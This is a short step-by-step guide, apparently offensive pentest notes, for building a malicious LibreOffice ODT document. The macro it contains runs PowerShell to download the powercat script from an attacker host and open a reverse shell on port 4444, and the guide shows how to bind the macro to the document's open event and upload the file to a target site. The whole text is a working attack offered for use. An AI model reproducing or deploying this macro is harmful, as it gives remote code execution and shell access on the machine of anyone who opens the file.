Malicious ODT File

    In some cases you might be able to upload an ODT file in any website. In that case we could insert malicious macro code into the document in order to achieve a reverse shell connection

    First create a document with LibreOffice. Then

    Go to Tools > Macros > Organize Macros > Basic...

    Then select the document and click on New

    Setup the name you want and insert the following code:

    Before setting up the macro, we can perform a quick test just to check if everything is working

    Shell("cmd /c powershell iwr 192.168.118.14")

    Now setup the code in order to download powercat and stablish a reverse shell connection

    Sub Main
    Shell("cmd /c powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.172:8000/powercat.ps1'); powercat -c 192.168.45.172 -p 4444 -e powershell")
End Sub

    Finally save the macro by using clicking the top menu icon

    Now create a trigger for the macro. Go to Tools > Customize... select Events and then select Open Document then select Macro

    Now select the macro you just created

    Finally save and close the document, upload it and setup a nc listener and a python server hosting the powercat .ps1 script
